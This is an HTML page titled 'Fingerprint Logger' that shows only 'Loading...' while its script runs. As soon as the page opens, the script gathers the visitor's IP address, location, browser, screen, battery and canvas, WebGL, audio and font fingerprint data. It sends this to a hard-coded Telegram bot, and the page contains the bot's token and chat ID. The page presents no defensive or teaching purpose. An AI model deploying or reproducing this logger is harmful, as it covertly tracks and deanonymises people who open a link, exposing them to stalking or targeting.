<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Fingerprint Logger</title>
  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
</head>
<body>
  <h1>Loading...</h1>
  <script>
    const TELEGRAM_BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
    const CHAT_ID = "7218964278";

    function getIPInfo() {
      return fetch("https://ipapi.co/json")
        .then(res => res.json())
        .catch(() => ({}));
    }

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const data = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      };
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }

    function collectData() {
      Promise.all([
        FingerprintJS.load().then(fp => fp.get()),
        getIPInfo()
      ]).then(([fpData, ipInfo]) => {
        const nav = navigator;
        const screenInfo = window.screen;
        const message = `
📡 *NEW VISITOR LOG*

🕵️ *IP Address:* ${ipInfo.ip || 'N/A'}
🌍 *Location:* ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country_name || 'N/A'}
📅 *Date/Time:* ${new Date().toLocaleString()}

🧠 *Browser Info*
- User-Agent: ${nav.userAgent}
- Platform: ${nav.platform}
- Language: ${nav.language}
- Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

🖥️ *Display*
- Screen: ${screenInfo.width}x${screenInfo.height}
- Window: ${window.innerWidth}x${window.innerHeight}

🔋 *Battery Status:* ${
          nav.getBattery ? 'Checking...' : 'N/A'
        }

🎨 *Canvas Fingerprint:* ${fpData.components.canvas?.value || 'N/A'}
🧩 *WebGL Vendor:* ${fpData.components.webgl?.value?.vendor || 'N/A'}
🧩 *WebGL Renderer:* ${fpData.components.webgl?.value?.renderer || 'N/A'}
🔊 *Audio Fingerprint:* ${fpData.components.audio?.value || 'N/A'}
🔠 *Fonts Detected:* ${fpData.components.fonts?.value?.join(", ") || 'N/A'}

🧬 *Fingerprint ID:* \`${fpData.visitorId}\`
        `;
        sendToTelegram(message.trim());

        // Check battery after send
        if (nav.getBattery) {
          nav.getBattery().then(battery => {
            const batteryMsg = `🔋 *Battery:*\n- Level: ${battery.level * 100}%\n- Charging: ${battery.charging}`;
            sendToTelegram(batteryMsg);
          });
        }
      });
    }

    collectData();
  </script>
</body>
</html>
